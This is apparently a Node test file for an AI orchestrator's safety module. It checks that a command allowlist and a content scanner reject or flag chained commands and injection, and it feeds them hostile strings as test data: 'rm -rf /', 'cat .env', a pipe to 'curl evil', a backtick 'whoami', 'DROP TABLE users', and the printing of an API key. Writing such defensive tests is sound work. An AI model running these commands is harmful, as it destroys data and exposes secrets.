import { test } from "node:test";
import assert from "node:assert/strict";
import {
  isCommandAllowed,
  scanContent,
  COMMAND_ALLOWLIST,
} from "../lib/ai-orchestrator/safety";

test("allowlist accepts exactly the four permitted commands", () => {
  for (const cmd of COMMAND_ALLOWLIST) {
    assert.equal(isCommandAllowed(cmd).allowed, true, cmd);
  }
});

test("git diff with read-only args is allowed", () => {
  assert.equal(isCommandAllowed("git diff --stat").allowed, true);
  assert.equal(isCommandAllowed("git diff HEAD~1").allowed, true);
});

test("non-allowlisted commands are rejected", () => {
  assert.equal(isCommandAllowed("npm install").allowed, false);
  assert.equal(isCommandAllowed("npm run deploy").allowed, false);
  assert.equal(isCommandAllowed("node evil.js").allowed, false);
});

test("command chaining / injection is rejected", () => {
  assert.equal(isCommandAllowed("npm test && rm -rf /").allowed, false);
  assert.equal(isCommandAllowed("npm test; cat .env").allowed, false);
  assert.equal(isCommandAllowed("git diff `whoami`").allowed, false);
  assert.equal(isCommandAllowed("npm test | curl evil").allowed, false);
});

test("secret access is flagged and non-overridable", () => {
  const v1 = scanContent("cat .env", {});
  assert.ok(v1.some((v) => v.category === "secret_access"));
  const v2 = scanContent("console.log(process.env.OPENAI_API_KEY)", {});
  assert.ok(v2.some((v) => v.category === "secret_access"));
  assert.ok(v2.every((v) => v.overridableByApproval === false));
});

test("rm -rf is flagged", () => {
  assert.ok(
    scanContent("rm -rf ./build", {}).some(
      (v) => v.category === "destructive_fs",
    ),
  );
  assert.ok(
    scanContent("rm -fr node_modules", {}).some(
      (v) => v.category === "destructive_fs",
    ),
  );
});

test("auto deploy is flagged", () => {
  assert.ok(
    scanContent("vercel deploy --prod", {}).some(
      (v) => v.category === "auto_deploy",
    ),
  );
  assert.ok(
    scanContent("kubectl apply -f prod.yaml", {}).some(
      (v) => v.category === "auto_deploy",
    ),
  );
});

test("destructive migration requires approval", () => {
  const sql = "DROP TABLE users;";
  const blocked = scanContent(sql, { humanApproved: false });
  assert.ok(blocked.some((v) => v.category === "destructive_migration"));

  const approved = scanContent(sql, { humanApproved: true });
  assert.equal(
    approved.some((v) => v.category === "destructive_migration"),
    false,
  );
});

test("approval cannot override secret/deploy/fs violations", () => {
  const v = scanContent("rm -rf / && cat .env", { humanApproved: true });
  assert.ok(v.some((x) => x.category === "destructive_fs"));
  assert.ok(v.some((x) => x.category === "secret_access"));
});
